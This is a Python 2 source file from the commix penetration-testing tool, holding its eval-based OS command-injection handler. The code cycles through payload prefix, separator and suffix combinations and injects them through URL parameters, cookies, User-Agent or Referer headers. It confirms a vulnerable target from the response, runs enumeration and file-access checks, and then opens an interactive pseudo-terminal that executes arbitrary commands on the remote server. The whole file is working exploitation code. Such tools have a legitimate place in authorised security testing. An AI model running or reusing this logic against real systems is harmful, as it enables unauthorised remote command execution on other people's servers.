#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import logs
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.results_based.techniques.eval_based import eb_injector
from src.core.injections.results_based.techniques.eval_based import eb_payloads
from src.core.injections.results_based.techniques.eval_based import eb_enumeration
from src.core.injections.results_based.techniques.eval_based import eb_file_access

"""
 The "eval-based" injection technique on Classic OS Command Injection.
"""

#-------------------------------------------------
# The "eval-based" injection technique handler.
#-------------------------------------------------
def eb_injection_handler(url, delay, filename, http_request_method):
  
  counter = 1
  vp_flag = True
  no_result = True
  export_injection_info = False
  injection_type = "Results-based Command Injection"
  technique = "eval-based injection technique"
  
  url = eb_injector.warning_detection(url)

  sys.stdout.write("(*) Testing the "+ technique + "... ")
  sys.stdout.flush()

  i = 0
  # Calculate all possible combinations
  total = len(settings.EVAL_PREFIXES) * len(settings.EVAL_SEPARATORS) * len(settings.EVAL_SUFFIXES)
  
  for prefix in settings.EVAL_PREFIXES:
    for suffix in settings.EVAL_SUFFIXES:
      for separator in settings.EVAL_SEPARATORS:
        i = i + 1
        
        # Check for bad combination of prefix and separator
        combination = prefix + separator
        if combination in settings.JUNK_COMBINATION:
          prefix = ""

        # Change TAG on every request to prevent false-positive results.
        TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))

        randv1 = random.randrange(100)
        randv2 = random.randrange(100)
        randvcalc = randv1 + randv2

        try:
          # Eval-based decision payload (check if host is vulnerable).
          payload = eb_payloads.decision(separator, TAG, randv1, randv2)
          
          suffix = urllib.quote(suffix)
          # Fix prefixes / suffixes
          payload = parameters.prefixes(payload, prefix)
          payload = parameters.suffixes(payload, suffix)

          payload = payload + "" + TAG + ""
          payload = re.sub(" ", "%20", payload)

          # Check if defined "--verbose" option.
          if menu.options.verbose:
            sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload + Style.RESET_ALL)

          # Cookie Injection
          if settings.COOKIE_INJECTION == True:
            # Check if target host is vulnerable to cookie injection.
            vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
            response = eb_injector.cookie_injection_test(url, vuln_parameter, payload)

          # User-Agent Injection
          elif settings.USER_AGENT_INJECTION == True:
            # Check if target host is vulnerable to user-agent injection.
            vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
            response = eb_injector.user_agent_injection_test(url, vuln_parameter, payload)

          # Referer Injection
          elif settings.REFERER_INJECTION == True:
            # Check if target host is vulnerable to referer injection.
            vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
            response = eb_injector.referer_injection_test(url, vuln_parameter, payload)

          else:
            found_cookie_injection = False
            # Check if target host is vulnerable.
            response, vuln_parameter = eb_injector.injection_test(payload, http_request_method, url)
  
          # if need page reload
          if menu.options.url_reload: 
            time.sleep(delay)
            response = urllib.urlopen(url)
            
          # Evaluate test results.
          shell = eb_injector.injection_test_results(response, TAG, randvcalc)
          if not menu.options.verbose:
            percent = ((i*100)/total)
            if percent == 100:
              if no_result == True:
                percent = Fore.RED + "FAILED" + Style.RESET_ALL
              else:
                percent = str(percent)+"%"
            elif len(shell) != 0:
              percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
            else:
              percent = str(percent)+"%"
            sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
            sys.stdout.flush()
            
        except KeyboardInterrupt: 
          raise
          
        except:
          continue
        
        # Yaw, got shellz! 
        # Do some magic tricks!
        if shell:
          found = True
          no_result = False

          if settings.COOKIE_INJECTION == True: 
            header_name = " Cookie"
            found_vuln_parameter = vuln_parameter
            the_type = " HTTP header"

          elif settings.USER_AGENT_INJECTION == True: 
            header_name = " User-Agent"
            found_vuln_parameter = ""
            the_type = " HTTP header"
            
          elif settings.REFERER_INJECTION == True: 
            header_name = " Referer"
            found_vuln_parameter = ""
            the_type = " HTTP header"

          else:    
            header_name = ""
            the_type = " parameter"
            if http_request_method == "GET":
              found_vuln_parameter = parameters.vuln_GET_param(url)
            else :
              found_vuln_parameter = vuln_parameter

          if len(found_vuln_parameter) != 0 :
            found_vuln_parameter = " '" + Style.UNDERLINE + found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'"

          # Print the findings to log file.
          if export_injection_info == False:
            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
          if vp_flag == True:
            vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
          logs.upload_payload(filename, counter, payload) 
          counter = counter + 1
          
          # Print the findings to terminal.
          print Style.BRIGHT + "\n(!) The ("+ http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to "+ injection_type + "." + Style.RESET_ALL
          print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
          print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL
            
          # Check for any enumeration options.
          eb_enumeration.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)

          # Check for any system file access options.
          eb_file_access.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)

          # Check if defined single cmd.
          if menu.options.os_cmd:
            eb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)

          # Pseudo-Terminal shell
          go_back = False
          while True:
            if go_back == True:
              break
            gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
            if gotshell in settings.CHOISE_YES:
              print ""
              print "Pseudo-Terminal (type '?' for shell options)"
              while True:
                try:
                  cmd = raw_input("Shell > ")
                  if cmd.lower() in settings.SHELL_OPTIONS:
                    if cmd.lower() == "?":
                      menu.shell_options()
                    elif cmd.lower() == "quit":
                      logs.logs_notification(filename)
                      sys.exit(0)
                    elif cmd.lower() == "back":
                      go_back = True
                      break
                    else:
                      pass
                      
                  else:
                    # The main command injection exploitation.
                    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
                          
                    # if need page reload
                    if menu.options.url_reload:
                      time.sleep(delay)
                      response = urllib.urlopen(url)
                      
                    # Command execution results.
                    shell = eb_injector.injection_results(response, TAG)
                    if shell:
                      shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
                      if shell != "":
                        print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
                      else:
                        print "\n" + Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL + "\n"
                    
                except KeyboardInterrupt: 
                  raise
              
            elif gotshell in settings.CHOISE_NO:
              if menu.options.verbose:
                sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
                sys.stdout.flush()
              break
            
            else:
              if gotshell == "":
                gotshell = "enter"
              print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
              pass
            
            
  if no_result == True:
    print ""
    return False

  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, delay, filename, http_request_method):
  if eb_injection_handler(url, delay, filename, http_request_method) == False:
    return False

#eof
